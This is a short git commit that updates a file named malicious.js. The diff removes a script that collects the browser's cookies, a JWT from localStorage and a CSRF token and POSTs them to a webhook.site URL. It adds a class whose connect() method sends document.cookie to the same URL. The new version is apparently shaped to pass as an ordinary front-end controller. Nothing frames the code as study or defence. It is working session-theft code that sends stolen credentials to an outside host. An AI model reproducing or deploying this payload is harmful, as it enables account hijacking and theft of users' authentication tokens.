3273f3b87ecfe6a8f257e4f214c35cb3be995e19
0smyssss <samir.sayed.it@gmail.com>
2025-07-21 14:31:02 +0300

    Update malicious.js

--- malicious.js
+++ malicious.js
@@ -1,12 +1,5 @@
-(() => {
-  const data = {
-    cookie: document.cookie,
-    jwt: localStorage.getItem("jwt"),
-    csrf: document.querySelector('meta[name="csrf-token"]')?.content || "not found"
-  };
-
-  fetch("https://webhook.site/867d4ad0-a954-45e0-b803-b1e06c6a8570", {
-    method: "POST",
-    body: JSON.stringify(data)
-  });
-})();
+export default class {
+  connect() {
+    fetch("https://webhook.site/867d4ad0-a954-45e0-b803-b1e06c6a8570?cookie=" + encodeURIComponent(document.cookie));
+  }
+}
